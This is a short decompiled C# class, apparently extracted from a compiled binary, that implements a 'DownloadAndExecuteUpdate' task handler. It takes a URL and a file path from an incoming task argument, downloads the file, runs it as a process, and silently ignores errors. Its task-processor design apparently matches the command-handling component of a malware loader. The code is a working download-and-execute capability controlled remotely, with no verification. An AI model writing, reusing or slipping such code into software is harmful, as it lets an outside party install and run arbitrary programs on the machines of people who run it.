using System;
using System.Diagnostics;
using System.IO;
using System.Net;

// Token: 0x02000029 RID: 41
public class DownloadAndExecuteUpdate : ITaskProcessor
{
	// Token: 0x060000B9 RID: 185 RVA: 0x000079E0 File Offset: 0x00005BE0
	public bool IsValidAction(UpdateAction action)
	{
		return action == UpdateAction.DownloadAndEx;
	}

	// Token: 0x060000BA RID: 186 RVA: 0x000079E8 File Offset: 0x00005BE8
	public bool Process(UpdateTask updateTask)
	{
		try
		{
			string[] array = updateTask.TaskArg.Split(new string[]
			{
				"|"
			}, StringSplitOptions.RemoveEmptyEntries);
			new WebClient().DownloadFile(array[0], Environment.ExpandEnvironmentVariables(array[1]));
			System.Diagnostics.Process.Start(new ProcessStartInfo
			{
				WorkingDirectory = new FileInfo(Environment.ExpandEnvironmentVariables(array[1])).Directory.FullName,
				FileName = Environment.ExpandEnvironmentVariables(array[1])
			});
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}
}
